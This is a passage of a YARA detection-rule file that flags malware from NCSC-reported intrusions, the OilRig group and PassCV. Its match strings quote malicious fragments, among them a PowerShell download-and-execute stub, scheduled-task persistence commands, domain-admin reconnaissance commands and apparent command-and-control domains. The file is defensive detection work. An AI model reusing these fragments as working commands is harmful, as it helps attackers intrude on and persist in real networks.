vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"NCSC\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Batch_Script_To_Run_PsExec\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $ = \"Tokens=1 delims=\" ascii\n        $ = \"SET ws=%1\" ascii\n        $ = \"Checking %ws%\" ascii\n        $ = \"%TEMP%\\\\%ws%ns.txt\" ascii\n        $ = \"ps.exe -accepteula\" ascii\n\n    condition:\n        3 of them\n}\n\nrule NCSCReport_Batch_Powershell_Invoke_Inveigh\n{\n    meta:\n        description = \"Malicious batch file from NCSC report\"\n        ref = \"https://www.ncsc.gov.uk/alerts/hostile-state-actors-compromising-uk-organisations-focus-engineering-and-industrial-control\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"NCSC\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Batch_Powershell_Invoke_Inveigh\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $ = \"Inveigh.ps1\" ascii\n        $ = \"Invoke-Inveigh\" ascii\n        $ = \"-LLMNR N -HTTP N -FileOutput Y\" ascii\n        $ = \"powershell.exe\" ascii\n\n    condition:\n        all of them\n}\n\nrule NCSCReport_lnk_detect\n{\n    meta:\n        description = \"Malicious LNK file from NCSC report\"\n        ref = \"https://www.ncsc.gov.uk/alerts/hostile-state-actors-compromising-uk-organisations-focus-engineering-and-industrial-control\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"NCSC\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"lnk_detect\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $lnk_magic = {4C 00 00 00 01 14 02 00 00 00 00 00 C0 00 00 00 00 00 00 46}\n        $lnk_target = {41 00 55 00 54 00 4F 00 45 00 58 00 45 00 43 00 2E 00 42 00 41 00 54}\n        $s1 = {5C 00 5C 00 31 00}\n        $s2 = {5C 00 5C 00 32 00}\n        $s3 = {5C 00 5C 00 33 00}\n        $s4 = {5C 00 5C 00 34 00}\n        $s5 = {5C 00 5C 00 35 00}\n        $s6 = {5C 00 5C 00 36 00}\n        $s7 = {5C 00 5C 00 37 00}\n        $s8 = {5C 00 5C 00 38 00}\n        $s9 = {5C 00 5C 00 39 00}\n\n    condition:\n        uint32be(0) == 0x4c000000 and uint32be(4) == 0x01140200 and (($lnk_magic at 0) and $lnk_target) and 1 of ($s*)\n}\n\nrule NCSCReport_RDP_Brute_Strings\n{\n    meta:\n        description = \"RDP brute forcer from NCSC report\"\n        ref = \"https://www.ncsc.gov.uk/alerts/hostile-state-actors-compromising-uk-organisations-focus-engineering-and-industrial-control\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"NCSC\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"RDP_Brute_Strings\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $ = \"RDP Brute\" ascii wide\n        $ = \"RdpChecker\" ascii\n        $ = \"RdpBrute\" ascii\n        $ = \"Brute_Count_Password\" ascii\n        $ = \"BruteIPList\" ascii\n        $ = \"Chilkat_Socket_Key\" ascii\n        $ = \"Brute_Sync_Stat\" ascii\n        $ = \"(Error! Hyperlink reference not valid.)\" wide\n        $ = \"BadRDP\" wide\n        $ = \"GoodRDP\" wide\n        $ = \"@echo off{0}:loop{0}del {1}{0}if exist {1} goto loop{0}del {2}{0}del \\\"{2}\\\"\" wide\n        $ = \"Coded by z668\" wide\n\n    condition:\n        4 of them\n}\n\nrule NCSCReport_Z_WebShell\n{\n    meta:\n        description = \"Z Webshell from NCSC report\"\n        ref = \"https://www.ncsc.gov.uk/alerts/hostile-state-actors-compromising-uk-organisations-focus-engineering-and-industrial-control\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"NCSC\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Z_WebShell\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $ = \"Z_PostBackJS\" ascii wide\n        $ = \"z_file_download\" ascii wide\n        $ = \"z_WebShell\" ascii wide\n        $ = \"1367948c7859d6533226042549228228\" ascii wide\n\n    condition:\n        3 of them\n}\n\nrule Oilrig_Malware_Campaign_Gen1\n{\n    meta:\n        description = \"Malware from OilRig Campaign\"\n        threat_names = \"OilRig\"\n        ref = \"https://goo.gl/QMRZ8K\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"OilRig_Malware_Campaign_Gen1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"Get-Content $env:Public\\\\Libraries\\\\update.vbs) -replace\" ascii\n        $x2 = \"wss.Run \\\"powershell.exe \\\" & Chr(34) & \\\"& {waitfor haha /T 2}\\\" & Chr(34), 0\" fullword ascii\n        $x3 = \"Call Extract(UpdateVbs, wss.ExpandEnvironmentStrings(\\\"%PUBLIC%\\\") & \\\"\\\\Libraries\\\\update.vbs\\\")\" fullword ascii\n        $s4 = \"CreateObject(\\\"WScript.Shell\\\").Run cmd, 0o\" fullword ascii\n        $b1 = \"JGdsb2JhbDpteWhvc3QgP\" ascii\n        $b2 = \"SE9NRT0iJXB1YmxpYyVcTGlicmFyaWVzX\" ascii\n        $b3 = \"U2V0IHdzcyA9IENyZWF0ZU9iamVjdCgid1NjcmlwdC5TaGV\" ascii\n        $b4 = \"JHNjcmlwdGRpciA9IFNwbGl0LVBhdGggLVBhcmVudCAtUGF0aCA\" ascii\n        $b5 = \"DQpTZXQgd3NzID0gQ3JlYXRlT2JqZWN\" ascii\n        $b6 = \"d2hvYW1pICYgaG9zdG5hb\" ascii\n\n    condition:\n        (uint16(0) == 0xcfd0 and filesize < 700KB and 1 of them)\n}\n\nrule Oilrig_Malware_Campaign_Mal1\n{\n    meta:\n        description = \"Malware from OilRig Campaign\"\n        threat_names = \"OilRig\"\n        ref = \"https://goo.gl/QMRZ8K\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"OilRig_Malware_Campaign_Mal1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"DownloadExecute=\\\"powershell \\\"\\\"&{$r=Get-Random;$wc=(new-object System.Net.WebClient);$wc.DownloadFile(\" ascii\n        $x2 = \"-ExecutionPolicy Bypass -File \\\"&HOME&\\\"dns.ps1\\\"\" fullword ascii\n        $x3 = \"CreateObject(\\\"WScript.Shell\\\").Run Replace(DownloadExecute,\\\"-_\\\",\\\"bat\\\")\" fullword ascii\n        $x4 = \"CreateObject(\\\"WScript.Shell\\\").Run DnsCmd,0\" fullword ascii\n        $s1 = \"http://winodwsupdates.me\" ascii\n\n    condition:\n        (uint16(0) == 0x4f48 and filesize < 4KB and 1 of them) or (2 of them)\n}\n\nrule Oilrig_Malware_Campaign_Gen2\n{\n    meta:\n        description = \"Malware from OilRig Campaign\"\n        threat_names = \"OilRig\"\n        ref = \"https://goo.gl/QMRZ8K\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"OilRig_Malware_Campaign_Gen2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"%userprofile%\\\\AppData\\\\Local\\\\Microsoft\\\\ \" fullword ascii\n        $s2 = \"$fdn=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('\" fullword ascii\n        $s3 = \"&{$rn = Get-Random; $id = 'TR\" fullword ascii\n        $s4 = \"') -replace '__',('DNS'+$id) | \" fullword ascii\n        $s5 = \"\\\\upd.vbs\" fullword ascii\n        $s6 = \"schtasks /create /F /sc minute /mo \" fullword ascii\n        $s7 = \"') -replace '__',('HTP'+$id) | \" fullword ascii\n        $s8 = \"&{$rn = Get-Random -minimum 1 -maximum 10000; $id = 'AZ\" fullword ascii\n        $s9 = \"http://www.israirairlines.com/?mode=page&page=14635&lang=eng<\" fullword ascii\n\n    condition:\n        (uint16(0) == 0xcfd0 and filesize < 4000KB and 2 of ($s*)) or (4 of them)\n}\n\nrule Oilrig_Malware_Campaign_Gen3\n{\n    meta:\n        description = \"Malware from OilRig Campaign\"\n        threat_names = \"OilRig\"\n        ref = \"https://goo.gl/QMRZ8K\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"OilRig_Malware_Campaign_Gen3\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"source code from https://www.fireeye.com/blog/threat-research/2016/05/targeted_attacksaga.htmlrrrr\" fullword ascii\n        $x2 = \"\\\\Libraries\\\\fireueye.vbs\" fullword ascii\n        $x3 = \"\\\\Libraries\\\\fireeye.vbs&\" fullword wide\n\n    condition:\n        (uint16(0) == 0xcfd0 and filesize < 100KB and 1 of them)\n}\n\nrule Oilrig_Malware_Campaign_Mal2\n{\n    meta:\n        description = \"Malware from OilRig Campaign\"\n        threat_names = \"OilRig\"\n        ref = \"https://goo.gl/QMRZ8K\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"OilRig_Malware_Campaign_Mal2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"wss.Run \\\"powershell.exe \\\" & Chr(34) & \\\"& {(Get-Content $env:Public\\\\Libraries\\\\update.vbs) -replace '__',(Get-Random) | Set-C\" ascii\n        $x2 = \"Call Extract(UpdateVbs, wss.ExpandEnvironmentStrings(\\\"%PUBLIC%\\\") & \\\"\\\\Libraries\\\\update.vbs\\\")\" fullword ascii\n        $x3 = \"mailto:Mohammed.sarah@gratner.com\" fullword wide\n        $x4 = \"mailto:Tarik.Imam@gartner.com\" fullword wide\n        $x5 = \"Call Extract(DnsPs1, wss.ExpandEnvironmentStrings(\\\"%PUBLIC%\\\") & \\\"\\\\Libraries\\\\dns.ps1\\\")\" fullword ascii\n        $x6 = \"2dy53My5vcmcvMjAw\" fullword wide\n\n    condition:\n        (uint16(0) == 0xcfd0 and filesize < 200KB and 1 of them)\n}\n\nrule Oilrig_Campaign_Reconnaissance\n{\n    meta:\n        description = \"Windows discovery commands - known from OilRig Campaign\"\n        threat_names = \"OilRig\"\n        ref = \"https://goo.gl/QMRZ8K\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"OilRig_Campaign_Reconnaissance\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"whoami & hostname & ipconfig /all\" ascii\n        $s2 = \"net user /domain 2>&1 & net group /domain 2>&1\" ascii\n        $s3 = \"net group \\\"domain admins\\\" /domain 2>&1 & \" ascii\n\n    condition:\n        (filesize < 1KB and 1 of them)\n}\n\nrule Oilrig_Malware_Campaign_Mal3\n{\n    meta:\n        description = \"Malware from OilRig Campaign\"\n        threat_names = \"OilRig\"\n        ref = \"https://goo.gl/QMRZ8K\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"OilRig_Malware_Campaign_Mal3\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"(Get-Content $env:Public\\\\Libraries\\\\dns.ps1) -replace ('#'+'##'),$botid | Set-Content $env:Public\\\\Libraries\\\\dns.ps1\" fullword ascii\n        $x2 = \"Invoke-Expression ($global:myhome+'tp\\\\'+$global:filename+'.bat > '+$global:myhome+'tp\\\\'+$global:filename+'.txt')\" fullword ascii\n        $x3 = \"('00000000'+(convertTo-Base36(Get-Random -Maximum 46655)))\" fullword ascii\n\n    condition:\n        (filesize < 10KB and 1 of them)\n}\n\nrule Oilrig_Chafer_Mimikatz_Custom\n{\n    meta:\n        description = \"Custom Mimikatz Version\"\n        threat_names = \"Mimikatz, OilRig\"\n        ref = \"https://nyotron.com/wp-content/uploads/2018/03/Nyotron-OilRig-Malware-Report-March-2018b.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth / Markus Neis\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Chafer_Mimikatz_Custom\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"C:\\\\Users\\\\win7p\\\\Documents\\\\mi-back\\\\\" ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 3000KB and 1 of them\n}\n\nrule Oilrig_Chafer_Exploit_Copyright_2017\n{\n    meta:\n        description = \"Oilrig Internet Server Extension\"\n        threat_names = \"OilRig\"\n        ref = \"https://nyotron.com/wp-content/uploads/2018/03/Nyotron-OilRig-Malware-Report-March-2018b.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Markus Neis\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Chafer_Exploit_Copyright_2017\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"test3 Internet Server Extension\" fullword wide\n        $x2 = \"Copyright (C) 2017 Exploit\" fullword wide\n        $a1 = \"popen() failed!\" fullword ascii\n        $a2 = \"cmd2cmd=\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 700KB and (1 of ($x*) or all of ($a*))\n}\n\nrule Oilrig_Chafer_Portscanner\n{\n    meta:\n        description = \"Custom Portscanner used by Oilrig\"\n        threat_names = \"OilRig\"\n        ref = \"https://nyotron.com/wp-content/uploads/2018/03/Nyotron-OilRig-Malware-Report-March-2018b.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Markus Neis\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Chafer_Portscanner\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"C:\\\\Users\\\\RS01204N\\\\Documents\\\\\" ascii\n        $x2 = \"PortScanner /ip:google.com  /port:80 /t:500 /tout:2\" fullword ascii\n        $x3 = \"open ports of host/hosts\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1000KB and 1 of them\n}\n\nrule Oilrig_Myrtille\n{\n    meta:\n        description = \"Oilrig Myrtille RDP Browser\"\n        threat_names = \"OilRig\"\n        ref = \"https://nyotron.com/wp-content/uploads/2018/03/Nyotron-OilRig-Malware-Report-March-2018b.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Markus Neis\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Oilrig_Myrtille\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"\\\\obj\\\\Release\\\\Myrtille.Services.pdb\" fullword ascii\n        $x2 = \"Failed to notify rdp client process exit (MyrtilleAppPool down?), remote session {0} ({1})\" fullword wide\n        $x3 = \"Started rdp client process, remote session {0}\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 50KB and 1 of them\n}\n\nrule Oilrig_Chafer_Packed_Mimikatz\n{\n    meta:\n        description = \"Oilrig Packed Mimikatz\"\n        threat_names = \"OilRig\"\n        ref = \"https://nyotron.com/wp-content/uploads/2018/03/Nyotron-OilRig-Malware-Report-March-2018b.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth / Markus Neis\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Chafer_Packed_Mimikatz\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Windows Security Credentials\" fullword wide\n        $s2 = \"Minisoft\" fullword wide\n        $x1 = \"Copyright (c) 2014 - 2015 Minisoft\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 300KB and (all of ($s*) or $x1)\n}\n\nrule Oilrig_PS_CnC\n{\n    meta:\n        description = \"Powershell C&C using DNS queries\"\n        threat_names = \"OilRig\"\n        ref = \"https://nyotron.com/wp-content/uploads/2018/03/Nyotron-OilRig-Malware-Report-March-2018b.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Markus Neis\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Oilrig_PS_CnC\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"(-join $base32filedata[$uploadedCompleteSize..$($uploadedCompleteSize\" fullword ascii\n        $s2 = \"$hostname = \\\"D\\\" + $fileID + (-join ((65..90) + (48..57) + (97..122)|\" ascii\n\n    condition:\n        filesize < 40KB and 1 of them\n}\n\nrule Oilrig_Strings_Oct17\n{\n    meta:\n        description = \"OilRig malware\"\n        threat_names = \"OilRig\"\n        ref = \"https://researchcenter.paloaltonetworks.com/2017/10/unit42-oilrig-group-steps-attacks-new-delivery-documents-new-injector-trojan/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"OilRig_Strings_Oct17\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"%localappdata%\\\\srvHealth.exe\" fullword wide ascii\n        $x2 = \"%localappdata%\\\\srvBS.txt\" fullword wide ascii\n        $x3 = \"Agent Injector\\\\PolicyConverter\\\\Inner\\\\obj\\\\Release\\\\Inner.pdb\" fullword ascii\n        $x4 = \"Agent Injector\\\\PolicyConverter\\\\Joiner\\\\obj\\\\Release\\\\Joiner.pdb\" fullword ascii\n        $s3 = \".LoadDll(\\\"Run\\\", arg, \\\"C:\\\\\\\\Windows\\\\\\\\\" ascii\n\n    condition:\n        filesize < 800KB and 1 of them\n}\n\nrule Oilrig_ISMAgent_Campaign_Samples1\n{\n    meta:\n        description = \"OilRig malware from Unit 42 report in October 2017\"\n        threat_names = \"OilRig\"\n        ref = \"https://goo.gl/JQVfFP\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"OilRig_ISMAgent_Campaign_Samples1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"###$$$TVqQAAMAAAAEAAAA\" ascii\n        $s2 = \"C:\\\\Users\\\\J-Win-7-32-Vm\\\\Desktop\\\\error.jpg\" fullword wide\n        $s3 = \"$DATA = [System.Convert]::FromBase64String([IO.File]::ReadAllText('%Base%'));[io.file]::WriteAllBytes(\" ascii\n        $s4 = \" /c echo powershell > \" fullword wide ascii\n        $s5 = \"\\\\Libraries\\\\servicereset.exe\" fullword wide\n        $s6 = \"%DestFolder%\" fullword wide ascii\n\n    condition:\n        uint16(0) == 0xcfd0 and filesize < 3000KB and 2 of them\n}\n\nrule Oilrig_ISMAgent_Campaign_Samples2\n{\n    meta:\n        description = \"OilRig malware from Unit 42 report in October 2017\"\n        threat_names = \"OilRig\"\n        ref = \"https://goo.gl/JQVfFP\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"OilRig_ISMAgent_Campaign_Samples2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"PolicyConverter.exe\" fullword wide\n        $x2 = \"SrvHealth.exe\" fullword wide\n        $x3 = \"srvBS.txt\" fullword wide\n        $s1 = \"{a3538ba3-5cf7-43f0-bc0e-9b53a98e1643}, PublicKeyToken=3e56350693f7355e\" fullword wide\n        $s2 = \"C:\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\v2.0.50727\\\\RegAsm.exe\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 700KB and (2 of ($x*) or 3 of them)\n}\n\nrule Oilrig_ISMAgent_Campaign_Samples3\n{\n    meta:\n        description = \"OilRig malware from Unit 42 report in October 2017\"\n        threat_names = \"OilRig\"\n        ref = \"https://goo.gl/JQVfFP\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"OilRig_ISMAgent_Campaign_Samples3\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"cmd /c schtasks /query /tn TimeUpdate > NUL 2>&1\" ascii\n        $x2 = \"schtasks /create /sc minute /mo 0002 /tn TimeUpdate /tr\" fullword ascii\n        $x3 = \"-c  SampleDomain.com -m scheduleminutes\" fullword ascii\n        $x4 = \".ntpupdateserver.com\" fullword ascii\n        $x5 = \".msoffice365update.com\" fullword ascii\n        $s1 = \"out.exe\" fullword ascii\n        $s2 = \"\\\\Win32Project1\\\\Release\\\\Win32Project1.pdb\" ascii\n        $s3 = \"C:\\\\windows\\\\system32\\\\cmd.exe /c (\" fullword ascii\n        $s4 = \"Content-Disposition: form-data; name=\\\"file\\\"; filename=\\\"a.a\\\"\" fullword ascii\n        $s5 = \"Agent configured successfully\" fullword ascii\n        $s6 = \"\\\\runlog*\" fullword ascii\n        $s7 = \"can not specify username!!\" fullword ascii\n        $s8 = \"Agent can not be configured\" fullword ascii\n        $s9 = \"%08lX%04hX%04hX%02hhX%02hhX%02hhX%02hhX%02hhX%02hhX%02hhX%02hhX\" fullword ascii\n        $s10 = \"!!! can not create output file !!!\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 400KB and (pe.imphash() == \"538805ecd776b9a42e71aebf94fde1b1\" or pe.imphash() == \"861ac226fbe8c99a2c43ff451e95da97\" or (1 of ($x*) or 3 of them))\n}\n\nrule Oilrig_RGDoor_Gen1\n{\n    meta:\n        description = \"RGDoor backdoor used by OilRig group\"\n        threat_names = \"OilRig\"\n        ref = \"https://researchcenter.paloaltonetworks.com/2018/01/unit42-oilrig-uses-rgdoor-iis-backdoor-targets-middle-east/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"OilRig_RGDoor_Gen1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $c1 = { 00 63 6D 64 24 00 00 00 00 72 00 00 00 00 00 00 00 75 70 6C 6F\n              61 64 24 }\n        $c2 = { 63 61 6E 27 74 20 6F 70 65 6E 20 66 69 6C 65 3A 20 00 00 00 00\n              00 00 00 64 6F 77 6E 6C 6F 61 64 24 }\n        $s1 = \"MyNativeModule.dll\" fullword ascii\n        $s2 = \"RGSESSIONID=\" fullword ascii\n        $s3 = \"download$\" fullword ascii\n        $s4 = \".?AVCHelloWorld@@\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 600KB and (pe.imphash() == \"47cb127aad6c7c9954058e61a2a6429a\" or 1 of ($c*) or 2 of them)\n}\n\nrule PassCV_Sabre_Malware_1\n{\n    meta:\n        description = \"PassCV Malware mentioned in Cylance Report\"\n        threat_names = \"PassCV\"\n        ref = \"https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"PassCV_Sabre_Malware_1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"F:\\\\Excalibur\\\\Excalibur\\\\Excalibur\\\\\" ascii\n        $x2 = \"bin\\\\oSaberSvc.pdb\" ascii\n        $s1 = \"cmd.exe /c MD \" fullword ascii\n        $s2 = \"https://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=0&rsv_idx=1&tn=baidu&wd=ip138\" fullword wide\n        $s3 = \"CloudRun.exe\" fullword wide\n        $s4 = \"SaberSvcB.exe\" fullword wide\n        $s5 = \"SaberSvc.exe\" fullword wide\n        $s6 = \"SaberSvcW.exe\" fullword wide\n        $s7 = \"tianshiyed@iaomaomark1#23mark123tokenmarkqwebjiuga664115\" fullword wide\n        $s8 = \"Internet Connect Failed!\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 1000KB and (1 of ($x*) and 5 of ($s*))) or (all of them)\n}\n\nrule PassCV_Sabre_Malware_Signing_Cert\n{\n    meta:\n        description = \"PassCV Malware mentioned in Cylance Report\"\n        threat_names = \"PassCV\"\n        ref = \"https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"PassCV_Sabre_Malware_Signing_Cert\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"WOODTALE TECHNOLOGY INC\" ascii\n        $s2 = \"Flyingbird Technology Limited\" ascii\n        $s3 = \"Neoact Co., Ltd.\" ascii\n        $s4 = \"AmazGame Age Internet Technology Co., Ltd\" ascii\n        $s5 = \"EMG Technology Limited\" ascii\n        $s6 = \"Zemi Interactive Co., Ltd\" ascii\n        $s7 = \"337 Technology Limited\" ascii\n        $s8 = \"Runewaker Entertainment0\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 3000KB and 1 of them)\n}\n\nrule PassCV_Sabre_Malware_2\n{\n    meta:\n        description = \"PassCV Malware mentioned in Cylance Report\"\n        threat_names = \"PassCV\"\n        ref = \"https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"PassCV_Sabre_Malware_2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"ncProxyXll\" fullword ascii\n        $s1 = \"Uniscribe.dll\" fullword ascii\n        $s2 = \"WS2_32.dll\" ascii\n        $s3 = \"ProxyDll\" fullword ascii\n        $s4 = \"JDNSAPI.dll\" fullword ascii\n        $s5 = \"x64.dat\" fullword ascii\n        $s6 = \"LSpyb2\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 4000KB and $x1) or (all of them)\n}\n\nrule PassCV_Sabre_Malware_Excalibur_1\n{\n    meta:\n        description = \"PassCV Malware mentioned in Cylance Report\"\n        threat_names = 